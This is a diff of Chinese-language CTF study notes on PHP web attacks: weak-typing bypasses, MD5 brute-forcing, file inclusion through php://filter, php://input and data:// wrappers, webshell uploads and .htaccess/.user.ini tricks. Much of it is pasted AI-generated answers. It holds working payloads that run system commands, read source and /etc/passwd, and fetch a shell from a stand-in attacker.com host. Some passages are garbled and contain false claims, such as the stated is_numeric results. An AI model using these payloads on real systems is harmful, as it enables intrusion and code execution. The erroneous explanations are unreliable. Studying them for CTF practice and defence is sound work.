@@ -6,7 +6,406 @@
     - 该文本不提供过于基础的问题
 ----
 
-### 文件上传漏洞知识点
+#### web基础知识
+- index.php是做什么的？
+- 如果把index.php删掉了会怎样？
+- index.php只能叫index.php吗？
+- 网站的每个目录都含有一个index.php吗？
+- 传统CMS中为什么建议每个目录下都有一个index.php？
+- 如果传统CMS目录中没有index.php,可能会发生什么？
+- 现代框架中index.php如何处理不访问根目录的url？
+- 常见文件名后缀在dirsearch中的使用:dirsearch.py -u http://target.com/ -e php,phps(这东西太复古了，攻防世界NO.GFSJ0235那道题用dirsearch扫不出来,bak,zip,txt
+<details>
+<summary> 协议和伪协议 </summary>
+
+
+-----
+
+#### 经典php
+<details>
+<summary>首先请看题</summary>
+
+```php
+<?php
+highlight_file(__FILE__);
+$key1 = 0;
+$key2 = 0;
+
+$a = $_GET['a'];
+$b = $_GET['b'];
+
+if(isset($a) && intval($a) > 6000000 && strlen($a) <= 3){
+    if(isset($b) && '8b184b' === substr(md5($b),-6,6)){
+        $key1 = 1;
+        }else{
+            die("Emmm...再想想");
+        }
+    }else{
+    die("Emmm...");
+}
+
+$c=(array)json_decode(@$_GET['c']);
+if(is_array($c) && !is_numeric(@$c["m"]) && $c["m"] > 2022){
+    if(is_array(@$c["n"]) && count($c["n"]) == 2 && is_array($c["n"][0])){
+        $d = array_search("DGGJ", $c["n"]);
+        $d === false?die("no..."):NULL;
+        foreach($c["n"] as $key=>$val){
+            $val==="DGGJ"?die("no......"):NULL;
+        }
+        $key2 = 1;
+    }else{
+        die("no hack");
+    }
+}else{
+    die("no");
+}
+
+if($key1 && $key2){
+    include "Hgfks.php";
+    echo "You're right"."\n";
+    echo $flag;
+}
+
+?> Emmm...
+```
+<details>
+<summary>if(isset($a) && intval($a) > 6000000 && strlen($a) <= 3)这个怎么绕过？</summary>
+
+这行代码是一个经典的 PHP CTF 逻辑绕过题。要绕过它，我们需要同时满足三个矛盾的条件：
+
+1. `isset($a)`: 变量  必须存在。
+2. `intval($a) > 6000000`:  的整数值必须大于 600 万。
+3. `strlen($a) <= 3`:  的字符串长度不能超过 3 个字符。
+
+看上去 6,000,001 至少有 7 位，远超 3 位的限制，但 PHP 的弱类型特性和科学计数法可以帮我们解决这个问题。
+
+---
+
+### 绕过方案：使用科学计数法
+
+在 PHP 中，`intval()` 函数在处理字符串时，会识别科学计数法（E 表示法）。
+
+**推荐 Payload:**
+`$a = "9e8"`
+
+### 为什么这个能行？
+
+* **长度检查：** `"9e8"` 只有 3 个字符（'9', 'e', '8'），满足 `strlen($a) <= 3`。
+* **数值检查：** 当 `intval("9e8")` 执行时，PHP 会将其解析为 ，即 **900,000,000**。
+* **对比结果：** 9 亿显然大于 600 万，满足 `intval($a) > 6000000`。
+
+---
+
+### 其他可能的变体
+
+如果环境中对字符有限制，你也可以尝试其他底数或指数，只要保持长度在 3 以内：
+
+* `"1e7"` ()
+* `"7e6"` ()
+
+### 关键原理说明
+
+| 函数 | 对 "9e8" 的处理 | 结果 |
+| --- | --- | --- |
+| **strlen()** | 计算原始字符串字符个数 | 3 |
+| **intval()** | 将字符串转为整数（支持科学计数法） | 900000000 |
+
+> **注意：** 这种绕过方式通常出现在 PHP 7.0 以下或特定的 `intval` 处理逻辑中。在某些严谨的强类型校验下，这种方法可能会失效，但在大多数 CTF 题目中这是标准解法。
+
+你想了解如何针对这类漏洞进行代码审计和防御修复吗？
+</details>
+
+<details>
+<summary> if(isset($b) && '8b184b' === substr(md5($b),-6,6))又怎么绕过？</summary>
+
+这是一个典型的 **MD5 截断哈希爆破**问题。
+
+代码的要求是：你输入的变量 `$b`，其 MD5 加密后的字符串的 **最后 6 位字符** 必须等于 `8b184b`。
+
+由于 MD5 是不可逆的，且这里使用了全等号 `===`（不存在弱类型绕过），**唯一的绕过方式就是“爆破”（Brute Force）**。
+
+---
+
+### 1. 绕过思路
+
+你需要写一个简单的脚本，不断尝试不同的输入（通常是数字或字母组合），计算它们的 MD5 值，直到找到一个以 `8b184b` 结尾的值。
+
+### 2. Python 爆破脚本
+
+这是一个高效的 Python 脚本，可以帮你快速找到符合条件的 `$b`：
+
+```python
+import hashlib
+
+target = '8b184b'
+
+# 尝试从 1 开始爆破到 10,000,000
+for i in range(10000000):
+    b = str(i)
+    md5_hash = hashlib.md5(b.encode()).hexdigest()
+    
+    # 获取最后 6 位进行比对
+    if md5_hash[-6:] == target:
+        print(f"找到匹配! 输入值 $b 应该是: {b}")
+        print(f"对应的 MD5 值: {md5_hash}")
+        break
+
+```
+
+### 3. 为什么不能直接“算”出来？
+
+MD5 是一种抗碰撞的哈希函数。
+
+* **不可逆性：** 你不能通过 `8b184b` 反向推导出原始字符串。
+* **雪崩效应：** 原始数据的微小改变都会导致哈希值巨大的变化。
+
+因此，这类题目考察的是你**编写自动化脚本的能力**。
+
+---
+
+### 4. 常见的 CTF 变体
+
+* **前缀匹配：** `substr(md5($b), 0, 6) === '123456'`（匹配前 6 位）。
+* **特定字符：** `md5($b) == '0e123...'`（这是 PHP 弱类型绕过，只要找到一个 MD5 结果以 `0e` 开头且后面全为数字的字符串即可）。
+
+**你可以直接尝试运行上面的脚本，通常在几秒钟内就能得到结果。需要我帮你直接跑出这个 `8b184b` 对应的数字吗？**
+</details>
+
+<details>
+<summary>if(is_array($c) && !is_numeric(@$c["m"]) && $c["m"] > 2022)这个怎么绕过</summary>
+
+这是一个包含多个条件的安全检查，让我分析如何绕过：
+
+## 条件分析
+```php
+if(is_array($c) && !is_numeric(@$c["m"]) && $c["m"] > 2022)
+```
+三个条件必须**同时满足**：
+1. `is_array($c)` - $c必须是数组
+2. `!is_numeric(@$c["m"])` - $c["m"]必须**不是**数字
+3. `$c["m"] > 2022` - $c["m"]必须大于2022
+
+## 矛盾点分析
+这里有个明显矛盾：
+- 条件2要求 `$c["m"]` **不是数字**
+- 条件3要求 `$c["m"]` **能进行数值比较且大于2022**
+
+## PHP的弱类型比较特性
+
+### 绕过方法1：使用数值字符串
+```php
+// JSON输入示例
+$c = '{"m":"2023a"}';
+// 或
+$c = '{"m":" 2023"}';
+// 或
+$c = '{"m":"2023 "}';
+```
+
+**原理**：
+- `is_numeric("2023a")` 返回 `false`（因为包含非数字字符）
+- 但 `"2023a" > 2022` 在比较时会自动类型转换：
+  - PHP会将字符串转换为数字（取前导数字部分）
+  - `"2023a"` → `2023`（类型转换）
+  - `2023 > 2022` → `true`
+
+### 绕过方法2：使用科学计数法字符串
+```php
+$c = '{"m":"2e3"}';  // 2e3 = 2000
+$c = '{"m":"2.023e3"}';  // 2023
+```
+
+**原理**：
+- `is_numeric("2e3")` 返回 `false`
+- `"2e3" > 2022` → `2000 > 2022` → `false`（不符合）
+- 需要大于2022，所以用 `"2.023e3"`（2023）
+
+### 绕过方法3：使用前导/尾随空格的数字字符串
+```php
+$c = '{"m":"2023 "}';    // 尾部空格
+$c = '{"m":" 2023"}';    // 前导空格
+$c = '{"m":"\t2023"}';   // 制表符
+```
+
+### 绕过方法4：使用特殊字符的数字字符串
+```php
+$c = '{"m":"2023\n"}';   // 换行符
+$c = '{"m":"2023\r"}';   // 回车符
+$c = '{"m":"+2023"}';    // 正号（is_numeric返回true，不能用）
+$c = '{"m":"-2023"}';    // 负号（数值不够大）
+```
+
+## 测试示例
+
+```php
+// 假设通过JSON传入
+$test_cases = [
+    '{"m":"2023a"}',     // ✓ 通过
+    '{"m":"2023 "}',     // ✓ 通过
+    '{"m":"2.023e3"}',   // ✓ 通过
+    '{"m":"2023\n"}',    // ✓ 通过
+    '{"m":"9999xxx"}',   // ✓ 通过
+];
+
+foreach ($test_cases as $json) {
+    $c = (array)json_decode($json);
+    
+    $cond1 = is_array($c);
+    $cond2 = !is_numeric(@$c["m"]);
+    $cond3 = @$c["m"] > 2022;
+    
+    echo "输入: $json\n";
+    echo "数组: " . ($cond1 ? '是' : '否') . "\n";
+    echo "非数字: " . ($cond2 ? '是' : '否') . "\n";
+    echo "大于2022: " . ($cond3 ? '是' : '否') . "\n";
+    echo "总结果: " . ($cond1 && $cond2 && $cond3 ? '通过' : '失败') . "\n\n";
+}
+```
+
+## 最有效的绕过方法
+
+```php
+// 最可靠的payload
+$payload = '{"m":"2023a"}';
+
+// 或者
+$payload = '{"m":"2023 "}';
+
+// 或者使用非常大的数字
+$payload = '{"m":"9999999999999999999999abc"}';
+// is_numeric()返回false，但比较时会变成INF（无穷大）
+```
+
+## 修复建议
+
+这种安全检查应该改为：
+```php
+// 正确的方式
+if(is_array($c) && isset($c["m"])) {
+    $m = $c["m"];
+    
+    // 严格类型检查
+    if(is_int($m) && $m > 2022) {
+        // 安全逻辑
+    }
+    
+    // 或者先转为整数再比较
+    $m_int = (int)$m;
+    if($m_int > 2022 && (string)$m_int === (string)$m) {
+        // 确保转换前后一致
+    }
+}
+```
+
+**关键问题**：PHP的弱类型比较导致了安全漏洞，应该使用`===`严格比较或进行类型验证。
+</details>
+
+<details>
+<summary>$d = array_search("DGGJ", $c["n"]);怎么绕过</summary>
+
+- 其实该点利用了php弱类型的一个知识点，***如果字符串开头没有数字，则默认是0***
+- 又由于array_search用的是弱类型<br>
+所以我们直接让c["n"]的值包含0即可
+</details>
+</details>
+
+-----
+#### 文件包含漏洞
+- file协议(file://)是做什么的，通常怎么用
+- php://input和data://都有什么用，怎么用？
+<details>
+<summary>data://协议例题摘要</summary>
+
+```php
+
+WRONG WAY! <?php
+include("flag.php");
+highlight_file(__FILE__);
+if(isset($_GET["file1"]) && isset($_GET["file2"]))
+{
+    $file1 = $_GET["file1"];
+    $file2 = $_GET["file2"];
+    if(!empty($file1) && !empty($file2))
+    {
+        if(file_get_contents($file2) === "hello ctf")
+        {
+            include($file1);
+        }
+    }
+    else
+        die("NONONO");
+}
+```
+<br>
+<details>
+<summary>
+该题原本构造了payload:file1=php://filter/read=convert.base64-encode/resource=flag.php&file2="hello ctf"但无法使用，原因是？
+</summary>
+
+你提供的 Payload 无法执行，主要原因在于对 `file2` 的处理方式上。`file_get_contents($file2)` 会尝试读取一个**文件**或**URL**的内容，而你直接传入了字符串 `"hello ctf"`，PHP 会把它当作一个文件名去寻找，显然找不到这个文件。
+
+以下是详细的代码逻辑分析和解决方案：
+
+### 1. 为什么你的 Payload 失败了？
+
+* **`file2` 的错误：** 当你设置 `file2="hello ctf"` 时，代码执行 `file_get_contents("hello ctf")`。因为服务器上不存在名为 `"hello ctf"` 的文件，函数会返回空或报错，自然不等于 `"hello ctf"`。
+* **`file1` 的语法：** 你的 `file1` 后面跟了一个逗号，这在 URL 参数中是不正确的。参数之间应该使用 `&` 分隔。
+
+---
+
+### 2. 正确的解决思路：PHP 伪协议
+
+要绕过 `file_get_contents($file2) === "hello ctf"`，最常用的方法是使用 **`php://input`** 或 **`data://`** 协议。
+
+#### 方法 A：使用 `data://` 协议（最推荐）
+
+`data://` 协议可以将输入流直接当作文件内容读取。
+
+* **Payload:**
+`?file1=php://filter/read=convert.base64-encode/resource=flag.php&file2=data://text/plain,hello ctf`
+
+#### 方法 B：使用 `php://input`
+
+`php://input` 可以读取 POST 请求中的原始数据。
+
+* **URL 参数:** `?file1=php://filter/read=convert.base64-encode/resource=flag.php&file2=php://input`
+* **POST 正文 (Body):** `hello ctf`
+
+---
+
+### 3. 完整的操作步骤
+
+1. **构建 URL：**
+使用 `data://` 协议最为方便，因为它只需要一个 GET 请求：
+```text
+http://61.147.171.103:54210/?file1=php://filter/read=convert.base64-encode/resource=flag.php&file2=data://text/plain,hello%20ctf
+
+```
+
+
+*(注意：`hello ctf` 中间的空格在 URL 中会自动变成 `%20`)*
+2. **获取 Base64 字符串：**
+执行后，页面会返回一串 Base64 编码的字符。
+3. **解码：**
+将这串字符进行 Base64 解码，即可看到 `flag.php` 的源代码，里面就藏着 Flag。
+
+---
+
+### 关键点总结表格
+
+| 组件 | 作用 | 你的错误点 |
+| --- | --- | --- |
+| **file1** | 用于包含并读取文件 | 后面不该用逗号，且建议加上 `resource=` 前缀 |
+| **file2** | 必须让 `file_get_contents` 返回指定字符串 | 不能直接写字符串，必须使用协议（如 `data://`） |
+| **Separator** | 连接多个参数 | 必须使用 `&` 而不是 `,` |
+
+你想让我帮你生成一个可以直接在浏览器或 Burp Suite 中使用的完整攻击链接吗？
+</details>
+</details>
+</details>
+
+------
+#### 文件上传漏洞知识点
 
 <details>
   <summary>文件上传必须是什么请求方式（三种，一种最常用）？</summary>
@@ -45,7 +444,6 @@
   其中eval就是执行命令的函数，**$_POST[‘a’]**就是接收的数据。eval函数把接收的数据当作PHP代码来执行。这样我们就能够让插入了一句话木马的网站执行我们传递过去的任意PHP语句。
 </details>
 
-> 形式更换
 - php,asp,aspx各是什么，它们的一句话木马又是什么？
 - 一句话木马整套攻击流程？
 - 一句话木马的原理？
@@ -266,8 +664,8 @@ php_value auto_prepend_file "http://attacker.com/shell.txt"
         </details>
   
 </details>
+</details>
 
-> 形式更换
 - 什么是.user.ini (php)，为什么它在文件上传漏洞中扮演着重要角色？
 - 为什么.user.ini和.htaccess这种配置文件尽管有专门的存放地点，但还是能在ctf题的上传文件目录中被使用？
 - .htaccess和.user.ini的区别（在哪一层，分别影响什么）？
@@ -304,3 +702,180 @@ IIS 解析漏洞：例如分号截断 image.asp;.jpg，IIS 6.0 会将其解析�
 这是最高级的欺骗方式：将恶意代码真正地嵌入到合法的二进制图片数据中。<br>
 操作方法：使用 copy /b image.jpg + shell.php webshell.jpg 命令将脚本合并到图片尾部，或者利用 EXIF 信息（如标题、版权字段）插入代码。<br>
 目的：确保文件既能通过后端严格的图形库（如 GD 库）的渲染检查，又能通过后缀修改或解析漏洞在服务器上运行。<br>
+</details></details>
+
+-----
+#### php读取不被希望读取的内容
+- php://filter是干嘛的？
+- 为什么需要用php://filter来输出php脚本内容，不能直接让网页直接处理输出php脚本内容？
+- php高危函数：include,require分别有什么特性，如何利用？
+- include一定会把包含的文件当成php代码执行吗？
+- include("php://filter/read=convert.base64-encode/resource=flag.php")为什么能用？
+<details>
+<summary>解释以下代码和相关问题</summary>
+
+```php
+    $lan = $_COOKIE['language'];
+    @include($lan.".php")
+```
+- $lan的内容是被引号包裹的吗？
+- include是把引号内的代码当作php执行了吗？
+- 该例子体现了php://filter的什么用途？
+</details>
+
+-----
+#### 文件上传/包含漏洞常见误区/用法
+<details>
+<summary>关于include等函数的误区</summary>
+
+- include,require等函数本质上是要去读取一个文件的（需要切实有文件）
+- php://filter看着像是传了个文本，实际上是把文件位置也给传了，所以能用
+- data://，php://input虽然没有创建新文件，但是其实际上其被处理为文件流，有文件的特征
+- file://同php://filter
+- data://和php://filter并不是一直能用的，其需要"allow_url_include=On"
+- data://和php://filter在include中可能不产生任何报错，如果啥输出没有，可能就要换方法了
+
+</details>
+
+<details>
+<summary>文件上传/包含漏洞的协议/伪协议的常见用法</summary>
+
+在CTF比赛中，文件包含（File Inclusion）和文件上传（File Upload）往往是获取权限（RCE）的核心入口。利用PHP伪协议（Wrappers）和各种编码技巧是绕过安全检测的必备手段。
+
+以下是针对CTF场景整理的超详细手册：
+
+---
+
+## 一、 PHP 伪协议深度利用
+
+PHP提供了一系列内置协议，用于在执行文件操作（如 `include`, `file_get_contents`, `copy` 等）时改变数据流的处理方式。
+
+### 1. php://filter（CTF中最常用）
+
+这是读取源代码的“神技”。当目标代码执行了 `include($file)` 但你无法直接读取 `.php` 文件的内容时，可以使用此协议进行 **Base64 编码**，防止代码被服务器解析执行，从而拿到源码。
+
+* **基本模板：**
+`php://filter/read=convert.base64-encode/resource=flag.php`
+* **进阶用法（绕过过滤器）：**
+如果过滤了 `base64`，可以尝试其他转换器：
+* `php://filter/read=string.rot13/resource=flag.php`（ROT13编码）
+* `php://filter/read=convert.quoted-printable-encode/resource=flag.php`
+
+
+* **多种过滤器嵌套：**
+`php://filter/read=convert.base64-encode|string.rot13/resource=flag.php`
+
+### 2. php://input
+
+用于读取 POST 数据包中的 **Raw Data**。如果 `allow_url_include` 为 **On**，可以将 POST 内容作为代码执行。
+
+* **用法：**
+* URL: `?file=php://input`
+* POST Body: `<?php system('ls'); ?>`
+
+
+
+### 3. data://
+
+数据协议，直接将代码嵌入 URL 中。同样需要 `allow_url_include=On`。
+
+* **用法：**
+* 明文：`data://text/plain,<?php system('whoami');?>`
+* Base64编码（绕过WAF）：`data://text/plain;base64,PD9waHAgc3lzdGVtKCdscCcpOz8+`
+
+
+
+### 4. phar:// 与 zip://
+
+这两个协议常用于**绕过文件上传限制**。如果你只能上传 `.jpg` 或 `.zip`，可以将 PHP 代码压缩后再访问。
+
+* **zip://** (需要绝对路径)
+1. 将 `shell.php` 压缩为 `test.zip`。
+2. 访问：`file=zip:///var/www/html/test.zip#shell.php`（注意 `#` 在 URL 中需编码为 `%23`）。
+
+
+* **phar://**
+1. 类似 zip，但不需要绝对路径，常用于反序列化攻击。
+2. 访问：`file=phar://test.phar/shell.php`
+
+
+
+---
+
+## 二、 文件上传中的加密与绕过技巧
+
+当后端有检测机制（WAF/黑名单/内容过滤）时，需要对 Payload 进行变形。
+
+### 1. 编码与加解密绕过
+
+如果后端检测 `<?php` 或 `eval` 等关键字：
+
+* **短标签（Short Tags）：**
+`<?= system('ls'); ?>` (等同于 `<?php echo ...`)
+* **JavaScript 风格（旧版本PHP）：**
+`<script language="php"> system('ls'); </script>`
+* **利用异或/取反（无字母数字RCE）：**
+通过不可见字符进行位运算生成想要的字符。
+* 示例：`$_ = ('@'^'#');`
+
+
+
+### 2. .htaccess / .user.ini 解析突破
+
+如果无法直接上传 PHP，但可以上传配置文件：
+
+* **Apache (.htaccess)：**
+上传一个 `.htaccess` 文件，内容如下，强制将所有文件（或特定文件）解析为 PHP：
+```apache
+AddType application/x-httpd-php .jpg
+
+```
+
+
+* **Nginx/PHP-FPM (.user.ini)：**
+如果目录下存在 PHP 文件，上传 `.user.ini` 包含后门：
+```ini
+auto_prepend_file=shell.jpg
+
+```
+
+
+
+### 3. 图片马与文件头绕过
+
+后端通过 `getimagesize()` 或检查文件头（Magic Bytes）来判断类型。
+
+* **添加伪造头：**
+在 PHP 代码前添加：`GIF89a` (GIF) 或 `\xff\xd8\xff` (JPEG)。
+* **二次渲染绕过：**
+如果后端使用 GD 库重新生成图片，你需要找到图片中**经过渲染后依然保持不变的像素区域**，将 PHP 代码嵌入该区域。
+
+---
+
+## 三、 CTF 常见过滤绕过总结表
+
+| 过滤对象 | 绕过手段 |
+| --- | --- |
+| **`<?php`** | `<?=`, `<script language="php">`, 或者是 Base64 编码后通过 `php://filter` 写入 |
+| **空格** | `%09` (Tab), `$IFS`, `{cmd,arg}` |
+| **引号** | 使用十六进制（`0x666c6167`）或 `chr()` 函数 |
+| **文件名后缀** | `.phtml`, `.php3`, `.php5`, `.phps`, `.pht` |
+| **目录限制** | `../../../../etc/passwd` (目录穿越) |
+| **特定函数** | `system` -> `passthru`, `shell_exec`, `popen`, ``` (反引号) |
+
+---
+
+## 四、 深度技巧：Filter Chain (过滤器链)
+
+在一些极端的 CTF 题目中，如果你只能控制 `include` 的路径，但无法控制文件内容，且没有现成的文件可利用，可以使用 **PHP Filter Chain** 构造出任意代码。
+
+其原理是通过 `convert.iconv.*` 过滤器不断转换编码，在内存流中“拼凑”出想要的字符，最终生成一个完整的 Base64 字符串并解码执行。这种方法不需要服务器上有任何现成文件，甚至不需要 `allow_url_include` 为 On。
+
+> **提示：** 这种 Payload 通常极长（几万个字符），可以使用现成的工具如 `php_filter_chain_generator` 生成。
+
+---
+
+**您是正在练习某道具体的 CTF 题目吗？如果有具体的过滤代码（PHP源码），我可以为您提供更针对性的绕过 Payload 编写建议。**
+
+</details>
+
